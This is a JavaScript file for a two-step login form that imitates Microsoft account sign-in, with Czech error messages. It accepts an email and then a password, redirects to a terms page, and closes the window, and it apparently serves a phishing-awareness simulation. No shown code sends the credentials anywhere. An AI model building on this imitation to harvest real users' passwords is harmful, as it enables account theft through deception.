document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Zadejte platnou e-mailovou adresu, telefonní číslo nebo jméno Skype.";
    const pwdReq = "Zadejte prosím heslo k účtu Microsoft.";
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";

    let unameVal = false;
    let pwdVal = false;

    /////next button
    const nxt = document.getElementById('btn_next');
    nxt.addEventListener('click', () => {
        validate();
        if (unameVal) {
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            });
            view = "pwd";
        }
    });

    //////sign in button
    const sig = document.getElementById('btn_sig');
    sig.addEventListener('click', () => {
        validate();
        if (pwdVal) {
            window.location.href = "terms.html";
        }
    });

    // Validace vstupu
    function validate() {
        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        function unameValAction(type) {
            if (!type) {
                document.getElementById('error_uname').innerText = unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp');
                unameVal = true;
            }
        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdInp.classList.add('error-inp');
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp');
                pwdVal = true;
            }
        }

        if (view === "uname") {
            const email = unameInp.value.trim();
            console.log("Email pro validaci:", email); // Debug
            if (email === "" || !validateEmail(email)) {
                console.log("Neplatný e-mail!");
                unameValAction(false);
            } else {
                console.log("Platný e-mail!");
                unameValAction(true);
            }
        } else if (view === "pwd") {
            if (pwdInp.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
        }
    }

    //back button
    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.toggle('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    });

    //final buttons
    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            window.open(location, '_self').close();
        });
    });
});